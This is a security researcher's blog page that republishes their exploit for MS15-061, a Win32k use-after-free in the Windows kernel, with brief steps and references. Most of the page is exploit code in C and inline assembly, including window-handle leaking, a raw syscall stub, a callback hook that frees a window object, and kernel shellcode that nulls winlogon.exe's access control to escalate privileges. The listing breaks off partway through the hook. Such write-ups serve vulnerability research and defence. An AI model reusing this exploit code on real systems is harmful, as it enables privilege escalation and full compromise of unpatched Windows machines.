@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Exploiting MS15-061 with reverse engineering Win32k.sys | My interesting researches</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Exploiting MS15-061 with reverse engineering Win32k.sys" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="MS15-061 is a Use After Free vulnerability in Windows Kernel. A malicious application can exploit it be able to execute arbitrary code with kernel privileges." />
+<meta property="og:description" content="MS15-061 is a Use After Free vulnerability in Windows Kernel. A malicious application can exploit it be able to execute arbitrary code with kernel privileges." />
+<link rel="canonical" href="http://localhost:4000/fuzzing/2024/04/01/explitingwind32k.html" />
+<meta property="og:url" content="http://localhost:4000/fuzzing/2024/04/01/explitingwind32k.html" />
+<meta property="og:site_name" content="My interesting researches" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-04-01T02:27:59+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Exploiting MS15-061 with reverse engineering Win32k.sys" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-04-01T02:27:59+02:00","datePublished":"2024-04-01T02:27:59+02:00","description":"MS15-061 is a Use After Free vulnerability in Windows Kernel. A malicious application can exploit it be able to execute arbitrary code with kernel privileges.","headline":"Exploiting MS15-061 with reverse engineering Win32k.sys","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/fuzzing/2024/04/01/explitingwind32k.html"},"url":"http://localhost:4000/fuzzing/2024/04/01/explitingwind32k.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="My interesting researches" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">My interesting researches</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Exploiting MS15-061 with reverse engineering Win32k.sys</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2024-04-01T02:27:59+02:00" itemprop="datePublished">Apr 1, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>MS15-061 is a Use After Free vulnerability in Windows Kernel. A malicious application can exploit it be able to execute arbitrary code with kernel privileges.</p>
+
+<p>in 2015 I managed to exploit it by reverse engineering Win32k.sys and it ended up in <a href="https://en.wikipedia.org/wiki/Metasploit">Metasploit</a>, you can read the blog post about it in <a href="https://www.rapid7.com/blog/post/2015/10/01/flipping-bits/">rapid7</a>.</p>
+
+<p>I’m republishing the exploit here.</p>
+
+<p>the code is heavly documented.
+steps:</p>
+<ul>
+  <li>Implement a PEB callback function for hooking.</li>
+  <li>trigger a vulnerability by creating a specific window to execute the vulnerable function.</li>
+  <li>Within the PEB callback, substitute a fake object with NtUserDefSetText in the Desktop heap.</li>
+  <li>Create a fake object with buffer filled with 0x0c0c0c0c and a pointer to tagWND. for safe dereferences: I used this trick similar to using fake vTable in Browser exploitation:
+  allocate 0x0c0c0c0c address and fill tagWND with 0x0c0c0c0c
+  so every dereference  will have a valid address in 0x0c0c0c0c range, this method can’t work on <a href="https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention">SMAP</a></li>
+  <li>Repeat this process until bServerSideWindowProc is set.</li>
+</ul>
+
+<p>Referenaces</p>
+<ul>
+  <li><a href="https://www.nccgroup.trust/globalassets/our-research/uk/whitepapers/2015/08/2015-08-27_-_ncc_group_-_exploiting_ms15_061_uaf_-_release.pdf">nccgroup</a></li>
+  <li><a href="http://www.mista.nu/research/mandt-win32k-slides.pdf">mista</a></li>
+  <li><a href="https://labs.mwrinfosecurity.com/blog/2013/09/06/mwr-labs-pwn2own-2013-write-up---kernel-exploit/">mwrinfosecurity</a></li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span>
+<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_HANDLEENTRY</span>
+<span class="p">{</span>
+    <span class="n">PVOID</span> <span class="n">phead</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">pOwner</span><span class="p">;</span>
+    <span class="n">BYTE</span> <span class="n">bType</span><span class="p">;</span>
+    <span class="n">BYTE</span> <span class="n">bFlags</span><span class="p">;</span>
+    <span class="n">WORD</span> <span class="n">wUniq</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">HANDLEENTRY</span><span class="p">,</span> <span class="o">*</span><span class="n">PHANDLEENTRY</span><span class="p">;</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_SERVERINFO</span>
+<span class="p">{</span>
+    <span class="n">DWORD</span> <span class="n">dwSRVIFlags</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">cHandleEntries</span><span class="p">;</span>
+    <span class="n">WORD</span> <span class="n">wSRVIFlags</span><span class="p">;</span>
+    <span class="n">WORD</span> <span class="n">wRIPPID</span><span class="p">;</span>
+    <span class="n">WORD</span> <span class="n">wRIPError</span><span class="p">;</span>
+
+<span class="p">}</span> <span class="n">SERVERINFO</span><span class="p">,</span> <span class="o">*</span><span class="n">PSERVERINFO</span><span class="p">;</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_SHAREDINFO</span>
+<span class="p">{</span>
+    <span class="n">PSERVERINFO</span> <span class="n">psi</span><span class="p">;</span>
+    <span class="n">PHANDLEENTRY</span> <span class="n">aheList</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">HeEntrySize</span><span class="p">;</span> <span class="c1">// Win7 - not present in WinXP?</span>
+    <span class="n">ULONG_PTR</span> <span class="n">pDispInfo</span><span class="p">;</span>
+    <span class="n">ULONG_PTR</span> <span class="n">ulSharedDelta</span><span class="p">;</span>
+    <span class="n">ULONG_PTR</span> <span class="n">awmControl</span><span class="p">;</span>        <span class="c1">// Not in XP</span>
+    <span class="n">ULONG_PTR</span> <span class="n">DefWindowMsgs</span><span class="p">;</span>     <span class="c1">// Not in XP</span>
+    <span class="n">ULONG_PTR</span> <span class="n">DefWindowSpecMsgs</span><span class="p">;</span> <span class="c1">// Not in XP</span>
+<span class="p">}</span> <span class="n">SHAREDINFO</span><span class="p">,</span> <span class="o">*</span><span class="n">PSHAREDINFO</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="o">*</span><span class="n">Get__Win32ClientInfo</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="cm">/*
+   +0x1d4 GdiTebBatch      : _GDI_TEB_BATCH
+   +0x6b4 RealClientId     : _CLIENT_ID
+   +0x6bc GdiCachedProcessHandle : Ptr32 Void
+   +0x6c0 GdiClientPID     : Uint4B
+   +0x6c4 GdiClientTID     : Uint4B
+   +0x6c8 GdiThreadLocalInfo : Ptr32 Void
+   +0x6cc Win32ClientInfo  : [62] Uint4B
+   */</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">address</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="kr">__asm</span>
+    <span class="p">{</span>
+	<span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mx">00000018h</span><span class="p">]</span> <span class="c1">// eax=TEB</span>
+        <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x6cc</span><span class="p">]</span> <span class="c1">// Win32ClientInfo</span>
+	<span class="n">mov</span>	  <span class="n">address</span><span class="p">,</span><span class="n">eax</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">address</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">CHAR</span> <span class="n">originalCLS</span><span class="p">[</span><span class="mh">0x5c</span> <span class="o">+</span> <span class="mi">2</span><span class="p">];</span>
+
+<span class="n">HWND</span> <span class="n">GetKernelHandle</span><span class="p">(</span><span class="n">HWND</span> <span class="n">hwnd</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">HWND</span> <span class="n">kernelWindowHandle</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">i</span><span class="p">;</span>
+    <span class="n">HMODULE</span> <span class="n">hUser32</span><span class="p">;</span>
+    <span class="n">PSHAREDINFO</span> <span class="n">pSharedInfo</span><span class="p">;</span>
+    <span class="n">PSERVERINFO</span> <span class="n">pServerInfo</span><span class="p">;</span>
+    <span class="n">HANDLEENTRY</span> <span class="o">*</span><span class="n">UserHandleTable</span><span class="p">;</span>
+
+    <span class="n">pSharedInfo</span> <span class="o">=</span> <span class="p">(</span><span class="n">PSHAREDINFO</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"user32.dll"</span><span class="p">),</span> <span class="s">"gSharedInfo"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">pSharedInfo</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Unable to locate SharedInfo"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[*] SharedInfo @ %#p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pSharedInfo</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">UserHandleTable</span> <span class="o">=</span> <span class="n">pSharedInfo</span><span class="o">-&gt;</span><span class="n">aheList</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] aheList @ %#p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">UserHandleTable</span><span class="p">);</span>
+
+    <span class="n">pServerInfo</span> <span class="o">=</span> <span class="n">pSharedInfo</span><span class="o">-&gt;</span><span class="n">psi</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] pServerInfo @ %#p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pServerInfo</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Handle Count: %d</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pServerInfo</span><span class="o">-&gt;</span><span class="n">cHandleEntries</span><span class="p">);</span>
+    <span class="c1">// printf("User Delta 0x%p\r\n", pSharedInfo-&gt;ulSharedDelta); Not used</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">pServerInfo</span><span class="o">-&gt;</span><span class="n">cHandleEntries</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="kr">__try</span>
+        <span class="p">{</span>
+            <span class="c1">//</span>
+            <span class="n">kernelWindowHandle</span> <span class="o">=</span> <span class="p">(</span><span class="n">HWND</span><span class="p">)(</span><span class="n">i</span> <span class="o">|</span> <span class="p">(</span><span class="n">UserHandleTable</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">wUniq</span> <span class="o">&lt;&lt;</span> <span class="mh">0x10</span><span class="p">));</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">kernelWindowHandle</span> <span class="o">==</span> <span class="n">hwnd</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">kernelWindowHandle</span> <span class="o">=</span> <span class="p">(</span><span class="n">HWND</span><span class="p">)</span><span class="n">UserHandleTable</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">phead</span><span class="p">;</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Kernel Window Handle found %p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kernelWindowHandle</span><span class="p">);</span>
+                <span class="k">return</span> <span class="n">kernelWindowHandle</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="kr">__except</span> <span class="p">(</span><span class="n">EXCEPTION_EXECUTE_HANDLER</span><span class="p">)</span>
+        <span class="p">{</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">VOID</span> <span class="n">ArbDecByOne</span><span class="p">(</span><span class="n">DWORD</span> <span class="n">addr</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">originalCLS</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">)</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="mh">0x4</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_LARGE_UNICODE_STRING</span>
+<span class="p">{</span>
+    <span class="n">ULONG</span> <span class="n">Length</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">MaximumLength</span> <span class="o">:</span> <span class="mi">31</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">bAnsi</span> <span class="o">:</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">PWSTR</span> <span class="n">Buffer</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">LARGE_UNICODE_STRING</span><span class="p">,</span> <span class="o">*</span><span class="n">PLARGE_UNICODE_STRING</span><span class="p">;</span>
+
+<span class="n">VOID</span> <span class="n">RtlInitLargeUnicodeString</span><span class="p">(</span>
+    <span class="n">PLARGE_UNICODE_STRING</span> <span class="n">plstr</span><span class="p">,</span>
+    <span class="n">LPCWSTR</span> <span class="n">psz</span><span class="p">,</span>
+    <span class="n">UINT</span> <span class="n">cchLimit</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">ULONG</span> <span class="n">Length</span><span class="p">;</span>
+
+    <span class="n">plstr</span><span class="o">-&gt;</span><span class="n">Buffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWSTR</span><span class="p">)</span><span class="n">psz</span><span class="p">;</span>
+    <span class="n">plstr</span><span class="o">-&gt;</span><span class="n">bAnsi</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">psz</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">Length</span> <span class="o">=</span> <span class="n">wcslen</span><span class="p">(</span><span class="n">psz</span><span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WCHAR</span><span class="p">);</span>
+        <span class="n">plstr</span><span class="o">-&gt;</span><span class="n">Length</span> <span class="o">=</span> <span class="n">min</span><span class="p">(</span><span class="n">Length</span><span class="p">,</span> <span class="n">cchLimit</span><span class="p">);</span>
+        <span class="n">plstr</span><span class="o">-&gt;</span><span class="n">MaximumLength</span> <span class="o">=</span> <span class="n">min</span><span class="p">((</span><span class="n">Length</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">UNICODE_NULL</span><span class="p">)),</span> <span class="n">cchLimit</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="n">plstr</span><span class="o">-&gt;</span><span class="n">MaximumLength</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">plstr</span><span class="o">-&gt;</span><span class="n">Length</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kr">__declspec</span><span class="p">(</span><span class="kr">naked</span><span class="p">)</span> <span class="n">BOOL</span> <span class="n">NTAPI</span> <span class="n">NtUserDefSetText</span><span class="p">(</span>
+    <span class="n">IN</span> <span class="n">HWND</span> <span class="n">hwnd</span><span class="p">,</span>
+    <span class="n">IN</span> <span class="n">PLARGE_UNICODE_STRING</span> <span class="n">pstrText</span> <span class="n">OPTIONAL</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kr">__asm</span>
+    <span class="p">{</span>
+        <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">116</span><span class="n">Dh</span>
+	<span class="n">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="mi">7</span><span class="n">FFE0300h</span>	
+	<span class="n">call</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">edx</span><span class="p">]</span>
+	<span class="n">retn</span>    <span class="mi">8</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// the Window Procedure</span>
+<span class="n">LRESULT</span> <span class="n">CALLBACK</span> <span class="n">WndProc</span><span class="p">(</span><span class="n">HWND</span> <span class="n">hwnd</span><span class="p">,</span> <span class="n">UINT</span> <span class="n">msg</span><span class="p">,</span> <span class="n">WPARAM</span> <span class="n">wParam</span><span class="p">,</span> <span class="n">LPARAM</span> <span class="n">lParam</span><span class="p">)</span>
+<span class="p">{</span>
+
+    <span class="k">return</span> <span class="n">DefWindowProc</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span> <span class="n">msg</span><span class="p">,</span> <span class="n">wParam</span><span class="p">,</span> <span class="n">lParam</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="o">*</span><span class="n">kernelHandle</span><span class="p">;</span>
+<span class="kr">__declspec</span><span class="p">(</span><span class="n">noinline</span><span class="p">)</span> <span class="kt">int</span> <span class="n">Shellcode</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="c1">// return MessageBoxA(NULL,"Boom","boom",0);</span>
+    <span class="kr">__asm</span> 
+    <span class="p">{</span>
+	<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">kernelHandle</span> <span class="c1">// WND - Which window? Check this</span>
+	<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span> <span class="c1">// THREADINFO</span>
+	<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span> <span class="c1">// ETHREAD</span>
+	<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x150</span><span class="p">]</span> <span class="c1">// KPROCESS</span>
+	<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xb8</span><span class="p">]</span> <span class="c1">// flink</span>
+	<span class="nl">procloop:</span>
+	<span class="n">lea</span> <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="o">-</span><span class="mh">0xb8</span><span class="p">]</span> <span class="c1">// KPROCESS</span>
+	<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
+	<span class="n">add</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0x16c</span> <span class="c1">// module name</span>
+	<span class="n">cmp</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">edx</span><span class="p">],</span> <span class="mh">0x6c6e6977</span> <span class="c1">// “winl” for winlogon.exe</span>
+	<span class="n">jne</span> <span class="n">procloop</span>
+	<span class="n">sub</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0x170</span>
+	<span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">edx</span><span class="p">],</span> <span class="mh">0x0</span> <span class="c1">// NULL ACL</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="n">BOOL</span> <span class="n">success</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
+<span class="n">LRESULT</span> <span class="n">CALLBACK</span> <span class="n">WndProc2</span><span class="p">(</span><span class="n">HWND</span> <span class="n">hwnd</span><span class="p">,</span> <span class="n">UINT</span> <span class="n">msg</span><span class="p">,</span> <span class="n">WPARAM</span> <span class="n">wParam</span><span class="p">,</span> <span class="n">LPARAM</span> <span class="n">lParam</span><span class="p">)</span>
+<span class="p">{</span>
+
+    <span class="n">WORD</span> <span class="n">um</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kr">__asm</span>
+    <span class="p">{</span>
+	<span class="n">mov</span> <span class="n">ax</span><span class="p">,</span> <span class="n">cs</span>
+	<span class="n">mov</span> <span class="n">um</span><span class="p">,</span> <span class="n">ax</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">um</span> <span class="o">==</span> <span class="mh">0x1b</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="c1">// USER MODE</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="n">success</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
+       <span class="c1">// DebugBreak();</span>
+
+        <span class="n">Shellcode</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">DefWindowProc</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span> <span class="n">msg</span><span class="p">,</span> <span class="n">wParam</span><span class="p">,</span> <span class="n">lParam</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">HWND</span> <span class="n">Secondhwnd</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
+<span class="kt">int</span> <span class="n">SecondWindowIndex</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="kt">void</span> <span class="n">CreateSecondWindow</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">WNDCLASSEX</span> <span class="n">wc</span><span class="p">;</span>
+    <span class="k">const</span> <span class="n">WCHAR</span> <span class="n">g_szClassName</span><span class="p">[]</span> <span class="o">=</span> <span class="s">L"SecondClass"</span><span class="p">;</span>
+
+    <span class="c1">// Step 1: Registering the Window Class</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">cbSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WNDCLASSEX</span><span class="p">);</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">style</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">lpfnWndProc</span> <span class="o">=</span> <span class="n">WndProc2</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">cbClsExtra</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">cbWndExtra</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">hInstance</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">hIcon</span> <span class="o">=</span> <span class="n">LoadIcon</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">IDI_QUESTION</span><span class="p">);</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">hCursor</span> <span class="o">=</span> <span class="n">LoadCursor</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">IDI_QUESTION</span><span class="p">);</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">hbrBackground</span> <span class="o">=</span> <span class="p">(</span><span class="n">HBRUSH</span><span class="p">)(</span><span class="n">COLOR_WINDOW</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">lpszMenuName</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">lpszClassName</span> <span class="o">=</span> <span class="n">g_szClassName</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">hIconSm</span> <span class="o">=</span> <span class="n">LoadIcon</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">IDI_QUESTION</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">RegisterClassExW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">wc</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">50</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">Secondhwnd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">CreateWindowEx</span><span class="p">(</span>
+            <span class="n">WS_EX_CLIENTEDGE</span><span class="p">,</span>
+            <span class="n">g_szClassName</span><span class="p">,</span>
+            <span class="s">L"The title of my window"</span><span class="p">,</span>
+            <span class="n">WS_OVERLAPPEDWINDOW</span><span class="p">,</span>
+            <span class="n">CW_USEDEFAULT</span><span class="p">,</span> <span class="n">CW_USEDEFAULT</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span>
+            <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">Secondhwnd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+        <span class="p">{</span>
+
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">const</span> <span class="n">WCHAR</span> <span class="n">g_szClassName</span><span class="p">[]</span> <span class="o">=</span> <span class="s">L"MS15-061"</span><span class="p">;</span>
+<span class="n">HWND</span> <span class="n">hwnd</span><span class="p">;</span>
+<span class="n">HINSTANCE</span> <span class="n">hInstance2</span><span class="p">;</span>
+<span class="k">typedef</span> <span class="n">NTSTATUS</span><span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span><span class="n">pUser32_ClientCopyImage</span><span class="p">)(</span><span class="n">PVOID</span> <span class="n">p</span><span class="p">);</span>
+<span class="n">pUser32_ClientCopyImage</span> <span class="n">g_originalCCI</span><span class="p">;</span>
+<span class="kt">void</span> <span class="o">*</span><span class="n">__ClientCopyImageAddress</span><span class="p">;</span>
+
+<span class="n">NTSTATUS</span> <span class="n">NTAPI</span> <span class="n">hookCCI</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">p</span><span class="p">)</span>
+<span class="p">{</span>
+
+    <span class="n">LARGE_UNICODE_STRING</span> <span class="n">plstr</span><span class="p">;</span>
+    <span class="c1">// free  WND object</span>
+    <span class="n">DestroyWindow</span><span class="p">(</span><span class="n">hwnd</span><span class="p">);</span>
+    <span class="n">UnregisterClassW</span><span class="p">(</span><span class="n">g_szClassName</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="cm">/*
+    .text:BF89EA6D                 push    edx
+    .text:BF89EA6E                 call    _xxxClientCopyImage@20 ; xxxClientCopyImage(x,x,x,x,x)
+    .text:BF89EA73                 lea     esi, [edi+58h]  -------&gt;&gt;&gt;&gt; replace edi memeory with NtUserDefSetText
+    .text:BF89EA76                 mov     edx, eax
+    .text:BF89EA78                 mov     ecx, esi
+    .text:BF89EA7A                 call    @HMAssignmentLock@8 ; HMAssignmentLock(x,x)
+
+    */</span>
+
+    <span class="n">DebugBreak</span><span class="p">();</span>
